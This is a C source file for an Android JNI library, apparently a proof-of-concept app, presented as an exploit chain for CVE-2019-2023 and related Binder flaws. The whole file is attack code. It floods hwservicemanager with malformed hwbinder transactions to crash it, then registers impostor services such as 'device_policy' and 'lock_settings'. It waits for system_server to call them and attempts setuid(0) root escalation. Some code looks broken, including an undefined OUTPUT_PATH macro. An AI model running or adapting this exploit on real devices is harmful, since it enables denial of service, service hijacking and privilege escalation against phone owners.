#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <android/log.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;
static volatile int g_exploit_success = 0;
static volatile int g_race_ready = 0;
static pid_t g_hwservicemanager_pid = 0;
static char g_output_path[256] = "/data/local/tmp/cve_result.txt";
static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";

// ============================================================
// ユーティリティ
// ============================================================
static void write_log(const char *msg) {
    FILE *fp = fopen(g_log_path, "a");
    if (fp) {
        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
        fclose(fp);
    }
}

static void write_result(const char *msg) {
    FILE *fp = fopen(g_output_path, "a");
    if (fp) {
        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
        fclose(fp);
    }
}

static pid_t get_hwservicemanager_pid(void) {
    FILE *fp = popen("pidof hwservicemanager 2>/dev/null", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) return -1;
    return pid;
}

// ============================================================
// CVE-2019-2023: ACL Bypassによるサービス登録（安定版）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;

    LOGI("[CVE-2019-2023] registering '%s'...", service_name);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        LOGE("malloc failed");
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2; // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0; // 読み取りなし（ブロック防止）
    bwr.read_buffer = 0;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    LOGI("ADD_SERVICE succeeded!");

    // GET_SERVICEでハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    *(uint32_t*)data = (uint32_t)name_len;
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1; // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        LOGE("ioctl GET_SERVICE failed: %s", strerror(errno));
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        LOGE("No handle returned");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    LOGI("Service handle: %d", handle);
    close(hwbinder_fd);
    return handle;
}

// ============================================================
// CVE-2020-0041: OOB書き込み（異常なoffsets_size）
// ============================================================
static int trigger_cve_2020_0041(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = 0xFFFFFFFF;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("CVE-2020-0041 triggered (expected error): %s", strerror(errno));
        return 0;
    }
    LOGI("CVE-2020-0041: ioctl succeeded unexpectedly");
    return 0;
}

// ============================================================
// CVE-2020-0273: BINDER_GET_NODE_INFO_FOR_REF (0x40046208)
// ============================================================
static int trigger_cve_2020_0273(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0xFFFFFFFF;

    int ret = ioctl(hwbinder_fd, BINDER_GET_NODE_INFO_FOR_REF, &info);
    close(hwbinder_fd);
    if (ret == 0) {
        LOGI("CVE-2020-0273: info leaked? strong=%u weak=%u", info.strong_count, info.weak_count);
        return 0;
    }
    LOGI("CVE-2020-0273: ioctl failed (expected): %s", strerror(errno));
    return 0;
}

// ============================================================
// CVE-2020-0423: 競合条件（大量のトランザクション送信）
// ============================================================
static int trigger_cve_2020_0423(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) return -1;

    // 子プロセスで大量のトランザクションを送信
    pid_t pid = fork();
    if (pid == 0) {
        // 子プロセスはすぐに_exitする
        _exit(0);
    } else if (pid > 0) {
        waitpid(pid, NULL, 0);
        // 親でさらに競合を起こす
        for (int i = 0; i < 100; i++) {
            struct binder_write_read bwr;
            memset(&bwr, 0, sizeof(bwr));
            ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
            usleep(10);
        }
        close(hwbinder_fd);
        LOGI("CVE-2020-0423: race condition test completed");
        return 0;
    }
    close(hwbinder_fd);
    return -1;
}

// ============================================================
// クラッシュペイロード1: 巨大サービス名（8KB）をADD_SERVICE
// ============================================================
static int crash_with_huge_name(void) {
    LOGI("Trying crash with 8KB service name...");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    int ret = exploit_cve_2019_2023(payload);
    free(payload);
    return ret;
}

// ============================================================
// クラッシュペイロード2: 無効オフセットを含むトランザクション
// ============================================================
static int send_malformed_transaction(void) {
    LOGI("Sending malformed transaction with invalid offsets...");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }

    uint8_t *data = malloc(4096);
    if (!data) { close(hwbinder_fd); return -1; }
    memset(data, 0x41, 4096);

    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++) {
        offsets[i] = 8192 + i * 8;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = sizeof(offsets);
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("Malformed transaction sent (expected error)");
        return 0;
    }
    LOGI("Malformed transaction succeeded unexpectedly");
    return 0;
}

// ============================================================
// クラッシュペイロード3: 異常なdata_size (0xFFFFFFFF)
// ============================================================
static int send_huge_data_transaction(void) {
    LOGI("Sending transaction with huge data_size...");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("Huge data transaction sent (expected error)");
        return 0;
    }
    LOGI("Huge data transaction succeeded unexpectedly");
    return 0;
}

// ============================================================
// クラッシュペイロード4: BINDER_SET_MAX_THREADS に異常値
// ============================================================
static int crash_set_max_threads(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }
    uint32_t max_threads = 0xFFFFFFFF;
    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    close(hwbinder_fd);
    LOGI("BINDER_SET_MAX_THREADS ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return 0;
}

// ============================================================
// クラッシュペイロード5: BINDER_SET_CONTEXT_MGR（権限不足でエラーになるはず）
// ============================================================
static int crash_set_context_mgr(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }
    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR, 0);
    close(hwbinder_fd);
    LOGI("BINDER_SET_CONTEXT_MGR ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return 0;
}

// ============================================================
// 複合クラッシュ攻撃（複数回実行）
// ============================================================
static int crash_hwservicemanager(void) {
    LOGI("Attempting multiple crash vectors...");
    int ret = 0;
    // 各ペイロードを複数回実行
    for (int i = 0; i < 3; i++) {
        ret |= crash_with_huge_name();
        usleep(100000);
        ret |= send_malformed_transaction();
        usleep(100000);
        ret |= send_huge_data_transaction();
        usleep(100000);
        ret |= trigger_cve_2020_0041();
        usleep(100000);
        ret |= trigger_cve_2020_0273();
        usleep(100000);
        ret |= trigger_cve_2020_0423();
        usleep(100000);
        ret |= crash_set_max_threads();
        usleep(100000);
        ret |= crash_set_context_mgr();
        usleep(100000);
        LOGI("Round %d completed", i+1);
    }

    pid_t new_pid = get_hwservicemanager_pid();
    if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
        LOGI("hwservicemanager crashed and restarted! New PID: %d", new_pid);
        g_hwservicemanager_pid = new_pid;
        return 0;
    } else {
        LOGI("hwservicemanager did not crash (still PID %d)", g_hwservicemanager_pid);
        return -1;
    }
}

// ============================================================
// Binderサーバーループ（system_serverからの呼び出しを待機）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    LOGI("Starting Binder server loop for handle %d...", expected_handle);
    LOGI("Waiting for transactions...");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            LOGE("ioctl read failed: %s", strerror(errno));
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        if (cmd_code == BR_NOOP) {
            continue;
        }

        LOGD("Received cmd=0x%x, size=%zu", cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            if (t->sender_euid == 1000) {
                LOGI("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
                // 権限昇格：setuid(0)を試み、結果をファイルに書き込む
                pid_t pid = fork();
                if (pid == 0) {
                    // 子プロセスでsetuidとid実行
                    setuid(0);
                    setresuid(0,0,0);
                    FILE *fp = fopen(g_output_path, "w");
                    if (fp) {
                        fprintf(fp, "=== Exploit Success ===\n");
                        fprintf(fp, "UID: %d\n", getuid());
                        fprintf(fp, "EUID: %d\n", geteuid());
                        fclose(fp);
                    }
                    // idコマンドも追記
                    system("id >> " OUTPUT_PATH " 2>&1");
                    _exit(0);
                } else if (pid > 0) {
                    wait(NULL);
                    LOGI("Privilege escalation attempted. Check %s", g_output_path);
                }
                g_exploit_success = 1;
            } else {
                LOGI("Sender uid=%d (ignoring)", t->sender_euid);
            }

            // 応答を返す
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            LOGI("Transaction #%d handled.", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            LOGI("Received DEAD_BINDER");
            break;
        } else {
            LOGD("Unhandled cmd=0x%x", cmd_code);
        }
    }
    return transaction_count;
}

// ============================================================
// サービス登録＋サーバー起動
// ============================================================
static void register_and_serve(const char *service_name) {
    int handle = exploit_cve_2019_2023(service_name);
    if (handle < 0) {
        LOGE("Failed to register '%s'", service_name);
        return;
    }
    LOGI("Registered '%s' (handle %d)", service_name, handle);

    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder for server failed: %s", strerror(errno));
        return;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        // 子プロセスはサーバーループを実行
        binder_server_loop(binder_fd, handle);
        _exit(0);
    } else if (pid > 0) {
        LOGI("Binder server for '%s' running (PID %d)", service_name, pid);
        close(binder_fd);
    } else {
        LOGE("fork server failed: %s", strerror(errno));
        close(binder_fd);
    }
}

// ============================================================
// JNIエクスポート関数
// ============================================================
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGI("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
    LOGI("JNI_OnUnload");
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetHwServicemanagerPid(JNIEnv* env, jclass clazz) {
    return get_hwservicemanager_pid();
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
                                                   jstring joutput_path,
                                                   jstring jlog_path) {
    const char *output_path = (*env)->GetStringUTFChars(env, joutput_path, NULL);
    const char *log_path = (*env)->GetStringUTFChars(env, jlog_path, NULL);
    if (output_path) {
        strncpy(g_output_path, output_path, sizeof(g_output_path) - 1);
        (*env)->ReleaseStringUTFChars(env, joutput_path, output_path);
    }
    if (log_path) {
        strncpy(g_log_path, log_path, sizeof(g_log_path) - 1);
        (*env)->ReleaseStringUTFChars(env, jlog_path, log_path);
    }

    LOGI("========================================");
    LOGI("CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack");
    LOGI("========================================");

    // ログファイル初期化
    FILE *fp = fopen(g_log_path, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
    }

    g_hwservicemanager_pid = get_hwservicemanager_pid();
    if (g_hwservicemanager_pid <= 0) {
        LOGI("Could not find hwservicemanager. Continuing anyway...");
    } else {
        LOGI("Current hwservicemanager PID: %d", g_hwservicemanager_pid);
    }

    // フェーズ1: クラッシュ攻撃（最大5回試行）
    LOGI("Phase 1: Crash hwservicemanager with multiple vectors");
    int crashed = 0;
    for (int i = 0; i < 5 && !crashed; i++) {
        if (crash_hwservicemanager() == 0) {
            crashed = 1;
        }
        sleep(2);
    }
    if (!crashed) {
        LOGI("Failed to crash hwservicemanager. Continuing anyway...");
    }

    // フェーズ2: 再起動待ち
    LOGI("Phase 2: Wait for hwservicemanager restart");
    int max_wait = 30;
    while (max_wait-- > 0) {
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
            LOGI("hwservicemanager restarted with PID: %d", new_pid);
            g_hwservicemanager_pid = new_pid;
            break;
        }
        sleep(1);
    }

    // フェーズ3: 全サービス再登録 & サーバー起動
    LOGI("Phase 3: Register all services and start servers");
    const char *target_services[] = {
        "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
        "android.hardware.power@1.0::IPower/default",
        "android.hardware.power.IPower",
        "persistent_data_block",
        "device_policy",
        "lock_settings",
        NULL
    };
    for (int i = 0; target_services[i] != NULL; i++) {
        register_and_serve(target_services[i]);
        usleep(300000);
    }

    // フェーズ4: 長時間待機（system_serverからの呼び出しを待つ）
    LOGI("Phase 4: Waiting for system_server to call...");
    LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);

    for (int i = 0; i < 180; i++) {
        sleep(1);
        if (g_exploit_success) break;
    }

    // 結果をファイルに書き込む
    if (g_exploit_success) {
        LOGI("Exploit succeeded! Check %s", g_output_path);
        write_result("Exploit succeeded: system_server called our service.");
        return 1;
    } else {
        LOGI("No transaction from system_server received.");
        LOGI("Try manually triggering system events (screen on/off, USB plug, etc.)");
        // フォールバック: setuid(0)を直接試みる
        if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
            LOGI("setuid(0) succeeded!");
            write_result("Fallback setuid(0) succeeded.");
            FILE *fp2 = fopen(g_output_path, "a");
            if (fp2) {
                fprintf(fp2, "UID: %d\n", getuid());
                fclose(fp2);
            }
            return 1;
        } else {
            write_result("Exploit failed: no system_server call and setuid failed.");
            return 0;
        }
    }
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeAddServiceOnly(JNIEnv* env, jclass clazz, jstring jname) {
    const char *name = (*env)->GetStringUTFChars(env, jname, NULL);
    if (!name) return -1;
    int handle = exploit_cve_2019_2023(name);
    (*env)->ReleaseStringUTFChars(env, jname, name);
    return handle;
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeStartServer(JNIEnv* env, jclass clazz, jint handle) {
    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open /dev/hwbinder failed: %s", strerror(errno));
        return -1;
    }

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    bwr.read_size = 0;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        LOGE("BC_ENTER_LOOPER failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }

    pid_t pid = fork();
    if (pid == 0) {
        binder_server_loop(binder_fd, handle);
        _exit(0);
    } else if (pid > 0) {
        LOGI("Binder server started (PID %d)", pid);
        close(binder_fd);
        return pid;
    } else {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
}
